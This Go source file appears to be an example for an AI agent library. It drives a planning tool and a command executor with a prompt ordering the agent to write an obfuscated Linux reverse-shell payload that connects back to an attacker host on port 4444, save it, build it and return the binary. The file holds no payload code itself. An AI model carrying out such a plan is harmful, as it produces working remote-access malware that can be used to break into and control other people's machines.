package main

import (
	"context"
	"fmt"
	"os"

	"github.com/Swarmind/libagent/pkg/config"
	"github.com/Swarmind/libagent/pkg/tools"

	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
)

/*
	This example shows usage of command executor with rewoo tool, which are whitelisted.
*/

const BuilderPrompt = `Here is the step by step actions plan:
	- Generate a reverse shell payload in Go for Linux. The payload should connect to %s on port 4444 and execute commands from the attacker. Include error handling and basic obfuscation techniques.
	- Create a file main.go and save result from first step
	- Print the code of main.go that have been generated
	- Try to build a binary (go build)
	- Return me path of the created binary
`

type PayloadGeneratorArgs struct {
	LHOST string `json:"lhost"`
}

func main() {
	//	zerolog.SetGlobalLevel(zerolog.DebugLevel)
	log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr})

	cfg, err := config.NewConfig()
	if err != nil {
		log.Fatal().Err(err).Msg("new config")
	}

	ctx := context.Background()

	lhost, exists := os.LookupEnv("HACKER_MSF_LHOST")
	if !exists {
		log.Fatal().Msg("HACKER_MSF_LHOST env cannot be empty")
	}

	fmt.Println(lhost)

	toolsExecutor, err := tools.NewToolsExecutor(ctx, cfg, tools.WithToolsWhitelist(
		tools.ReWOOToolDefinition.Name,
		tools.CommandExecutorDefinition.Name,
	))
	if err != nil {
		log.Fatal().Err(err).Msg("new tools executor")
	}
	defer func() {
		if err := toolsExecutor.Cleanup(); err != nil {
			log.Fatal().Err(err).Msg("tools executor cleanup")
		}
	}()

	rewooQuery := tools.ReWOOToolArgs{
		Query: fmt.Sprintf(BuilderPrompt, lhost), // Replace %s with LHOST
	}
	// payloadGeneratorArgsBytes, err := json.Marshal(rewooQuery) // Remove unused variable
	// if err != nil {
	// 	log.Fatal().Err(err).Msg("json marhsal rewooQuery")
	// }

	result, err := toolsExecutor.CallTool(ctx,
		tools.ReWOOToolDefinition.Name,
		rewooQuery.Query, // Pass the query directly
	)
	if err != nil {
		log.Fatal().Err(err).Msg("rewoo tool call")
	}

	fmt.Println(result)
}
